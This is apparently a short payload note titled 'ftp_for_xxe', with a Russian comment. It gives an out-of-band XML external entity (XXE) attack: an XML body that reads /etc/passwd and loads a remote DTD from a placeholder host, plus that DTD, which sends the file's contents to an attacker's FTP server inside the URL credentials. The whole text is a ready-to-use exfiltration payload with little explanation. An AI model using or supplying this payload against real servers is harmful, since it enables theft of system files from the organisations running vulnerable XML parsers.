# ftp_for_xxe
```
<?xml version="1.0"?>
<!DOCTYPE data [ 
 <!ENTITY % file SYSTEM "file:///etc/passwd"> содержание этого файла придет в качестве запроса на ftp сервер
 <!ENTITY % dtd SYSTEM "http://your.host/remote.dtd"> 
%dtd;]>
<data>&send;</data>
```

http://your.host/remote.dtd (https://webhook.site)

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://test:%file;@{ftp_ip}:{ftp_port}/'>"> %all;
```
